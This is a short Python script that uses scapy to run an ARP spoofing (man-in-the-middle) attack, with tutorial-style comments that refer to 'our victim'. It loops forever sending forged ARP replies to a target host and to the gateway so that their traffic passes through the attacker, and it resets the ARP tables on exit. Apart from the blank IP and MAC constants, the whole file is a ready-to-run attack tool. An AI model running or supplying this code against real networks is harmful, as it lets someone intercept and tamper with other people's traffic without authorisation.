import time
import scapy.all as scapy


TARGET_MAC = ''
DESTINATION_MAC = ''

TARGET_IP = ''
GATEWAY_IP = ''


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    # print(answered_list[0])
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = TARGET_MAC
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # Verbose set to False is going to prevent the script from printing "1 packet sent"


def restore(destination_ip, source_ip):
    # We use this function to restore regular traffic network by giving the router and our victim
    # each other's correct MAC address
    destination_mac = DESTINATION_MAC
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # We use the function get_mac() to find out the mac address of the destination IP and source IP,
    # which we then store inside the variables destination_mac and source_mac
    scapy.send(packet, count=4, verbose=False)


target_ip = TARGET_IP
gateway_ip = GATEWAY_IP

# We set op's value to two because we need to create a response, not a request
# 1 = request, 2 = response
# pdst = Target IP
# hwdst = Target MAC
# psrc, or the source field, is set to match the IP of the router. We are going to tell the target computer that the response is coming from the router

try:
    sent_packets = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets += 2
        print('\r[+] Packets sent:' + str(sent_packets), end="")
        # By adding \r, we force Python to start printing from the start of the line
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Detected CTRL + C ... Resetting ARP tables..... Please wait')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
